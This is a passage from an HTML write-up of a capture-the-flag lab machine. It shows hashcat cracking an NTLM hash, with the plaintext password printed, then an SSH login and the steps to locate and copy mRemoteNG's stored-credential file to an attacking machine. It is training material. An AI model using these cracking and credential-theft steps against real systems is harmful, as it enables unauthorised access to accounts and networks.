+                &nbsp;&nbsp;&nbsp;5600&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NetNTLMv2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Network&nbsp;Protocols<br>
+                &nbsp;&nbsp;&nbsp;3000&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;LM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Operating&nbsp;Systems<br>
+                &nbsp;&nbsp;&nbsp;1000&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Operating&nbsp;Systems<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;hashcat&nbsp;-m&nbsp;1000&nbsp;-a&nbsp;3&nbsp;l4mpjeHash.txt&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>rockyou.txt
+            </div>
+        </div><br>
+        <br>
+        26112010952d963c8dc4217daec986d9:bureaulampje<br>
+        <br>
+        Login to the target via SSH, which we learnt was running on the target from nmap, and get user.txt :)<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;L4mpje@10.10.10.134<br>
+                L4mpje@10.10.10.134s&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;bureaulampje<br>
+                <br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;10.0.14393]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">(</span>c<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2016&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                l4mpje@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\L</span>4mpje<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">dir</span><br>
+                &nbsp;Volume&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;0CB3-C487<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\L</span>4mpje<br>
+                <br>
+                22-02-2019&nbsp;&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>50&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<br>
+                22-02-2019&nbsp;&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>50&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Contacts<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>27&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Desktop<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Documents<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Downloads<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Favorites<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Links<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Music<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Pictures<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Saved&nbsp;Games<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Searches<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Videos<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;File<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13&nbsp;Dir<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;11.361.738.752&nbsp;bytes&nbsp;<span style="color:#ff9d00;font-weight:700">free</span><br>
+                <br>
+                l4mpje@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\L</span>4mpje<span style="color:#ffdd00;font-weight:400">&gt;</span>cd&nbsp;Desktop<br>
+                <br>
+                l4mpje@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\L</span>4mpje<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">dir</span><br>
+                &nbsp;Volume&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
+                <br>
+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;0CB3-C487<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\L</span>4mpje<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                <br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>27&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;<br>
+                22-02-2019&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>27&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>07&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32&nbsp;user.txt<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;File<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;Dir<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;11.361.738.752&nbsp;bytes&nbsp;<span style="color:#ff9d00;font-weight:700">free</span><br>
+                <br>
+                l4mpje@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\L</span>4mpje<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#ffdd00;font-weight:400">&gt;</span>type&nbsp;user.txt<br>
+                9bfe5...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Privesc</strong></h2><br>
+        Have a look at the programs installed.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;L4mpje@10.10.10.134<br>
+                L4mpje@10.10.10.134s&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;bureaulampje<br>
+                <br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;10.0.14393]<br>
+                <span style="color:#ff9d00;font-weight:700">(</span>c<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2016&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                l4mpje@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\L</span>4mpje<span style="color:#ffdd00;font-weight:400">&gt;</span>cd&nbsp;..<span style="color:#333333;font-weight:400">\.</span>.<br>
+                <br>
+                l4mpje@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span><span style="color:#ff9d00;font-weight:700">dir</span><br>
+                &nbsp;Volume&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;0CB3-C487<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span>\<br>
+                <br>
+                23-05-2019&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>46&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Backups<br>
+                12-09-2016&nbsp;&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>35&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logs<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>42&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PerfLogs<br>
+                16-04-2019&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>18&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Program&nbsp;Files<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Program&nbsp;Files&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>x86<span style="color:#ff9d00;font-weight:700">)</span><br>
+                22-02-2019&nbsp;&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>50&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Users<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>38&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;File<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7&nbsp;Dir<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;11.429.576.704&nbsp;bytes&nbsp;<span style="color:#ff9d00;font-weight:700">free</span><br>
+                <br>
+                l4mpje@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span>cd&nbsp;<span style="color:#3ad900;font-weight:400">"Program&nbsp;Files&nbsp;(x86)"</span><br>
+                <br>
+                l4mpje@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\P</span>rogram&nbsp;Files&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>x86<span style="color:#ff9d00;font-weight:700">)</span>&gt;<span style="color:#ff9d00;font-weight:700">dir</span><br>
+                &nbsp;Volume&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;0CB3-C487<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\P</span>rogram&nbsp;Files&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>x86<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br>
+                16-07-2016&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>23&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Common&nbsp;Files<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>38&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Internet&nbsp;Explorer<br>
+                16-07-2016&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>23&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft.NET<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mRemoteNG<br>
+                23-02-2019&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>22&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Defender<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>38&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Mail<br>
+                23-02-2019&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>22&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Media&nbsp;Player<br>
+                16-07-2016&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>23&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Multimedia&nbsp;Platform<br>
+                16-07-2016&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>23&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;NT<br>
+                23-02-2019&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>22&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Photo&nbsp;Viewer<br>
+                16-07-2016&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>23&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Portable&nbsp;Devices<br>
+                16-07-2016&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>23&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WindowsPowerShell<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;File<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;14&nbsp;Dir<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;11.429.576.704&nbsp;bytes&nbsp;<span style="color:#ff9d00;font-weight:700">free</span>
+            </div>
+        </div><br>
+        <br>
+        What is mRemoteNG?<br>
+        <a href="https://mremoteng.org/">https://mremoteng.org/</a> - it appears to be an organiser of all your remote connections.<br>
+        <br>
+        <code>searchsploit</code> doesn't have anything.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;searchsploit&nbsp;mRemoteNG<br>
+                Exploits<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;Result<br>
+                Shellcodes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        But google provides where searchsploit doesn't - “mRemoteNG exploit�.<br>
+        <br>
+        <a href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/mremote">https://www.rapid7.com/db/modules/post/windows/gather/credentials/mremote</a><br>
+        There's a metapsloit module to decrypt passwords from the application. I have no idea whether this works, I didn't try it because I didn't have a meterpreter session on the system and because it's a pain to get one since (according to metasploit) there's no powershell on the target.<br>
+        <br>
+        More google results:<br>
+        <a href="https://old.reddit.com/r/mRemoteNG/comments/66hzoe/mremoteng_password_storage_is_insecure/">https://old.reddit.com/r/mRemoteNG/comments/66hzoe/mremoteng_password_storage_is_insecure/</a> - links to - <a href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">http://hackersvanguard.com/mremoteng-insecure-password-storage/</a> which provides a handy tutorial on how to extract passwords from the program using its own portable GUI application.<br>
+        <br>
+        The config file, which holds all the connections and their passwords for mRemoteNG, is stored in <code>C:\Users\&lt;username&gt;\AppData\Roaming\mRemoteNG\confCons.xml</code><br>
+        <br>
+        <strong>5</strong><a id="h3-1" name="h3-1"></a>
+        <h3>a) Transfer confCons.xml</h3><br>
+        The output of my ssh shell to the windows target was odd (this might be normal? it had huge strings of spaces after each line) so I used <code>scp</code> to transfer the <code>confCons.xml</code> file to my kali machine.<br>
+        <br>
+        If you try copy/paste the content of confCons.xml with this weirdly formatted windows shell, the xml formatting will be all wrong because of all the newlines and the none of the tools will work (for me they didn't, anyway).<br>
+        <br>
+        Configure ssh on kali so that <code>scp</code> will work:<br>
+        Allow for root login using password by editing <code>/etc/ssh/sshd_config</code> to include <code>PermitRootLogin yes</code> and restart the service.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;nano&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/ssh/</span>sshd_config<br>
+                ...<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Authentication:</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#LoginGraceTime&nbsp;2m</span><br>
+                PermitRootLogin&nbsp;yes<br>
+                <span style="color:#0088ff;font-weight:400">#StrictModes&nbsp;yes</span><br>
+                <span style="color:#0088ff;font-weight:400">#MaxAuthTries&nbsp;6</span><br>
+                <span style="color:#0088ff;font-weight:400">#MaxSessions&nbsp;10</span><br>
+                ...<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;service&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;restart
+            </div>
+        </div><br>
+        <br>
+        Now we can scp as root.<br>
+        Navigate to where the confCons.xml file is - <code>C:\Users\L4mpje\AppData\Roaming\mRemoteNG</code> and <code>scp</code> it to your attacking machine.<br>
+            <div class="codebox">
+                l4mpje@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span>cd&nbsp;Users<span style="color:#333333;font-weight:400">\L</span>4mpje<span style="color:#333333;font-weight:400">\A</span>ppData<span style="color:#333333;font-weight:400">\R</span>oaming<span style="color:#333333;font-weight:400">\m</span>RemoteNG<br>
+                <br>
+                l4mpje@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\L</span>4mpje<span style="color:#333333;font-weight:400">\A</span>ppData<span style="color:#333333;font-weight:400">\R</span>oaming<span style="color:#333333;font-weight:400">\m</span>RemoteNG<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">dir</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>a<br>
+                &nbsp;Volume&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
